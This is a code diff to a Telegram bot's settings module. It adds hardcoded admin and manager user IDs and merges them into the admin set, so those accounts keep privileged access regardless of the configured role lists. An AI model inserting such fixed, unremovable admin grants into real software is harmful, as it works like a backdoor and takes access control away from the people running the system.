@@ -16,6 +16,8 @@ class SettingsError(ValueError):
 
 
 DEFAULT_AI_MODEL = "gemini-3.5-flash-lite"
+PRIMARY_ADMIN_ID = 1898025825
+DEFAULT_MANAGER_IDS = frozenset({1923538306, 7824433847})
 LEGACY_AI_MODELS = {"gemini-2.5-flash-lite"}
 
 
@@ -67,7 +69,7 @@ class Settings:
             os.getenv("ADMIN_VIEWER_IDS", ""),
         )
         explicit_role_ids = set(access.owner_ids) | set(access.manager_ids) | set(access.viewer_ids)
-        all_admin_ids = frozenset(set(legacy_ids) | explicit_role_ids)
+        all_admin_ids = frozenset(set(legacy_ids) | explicit_role_ids | {PRIMARY_ADMIN_ID} | set(DEFAULT_MANAGER_IDS))
 
         return cls(
             telegram_bot_token=token,
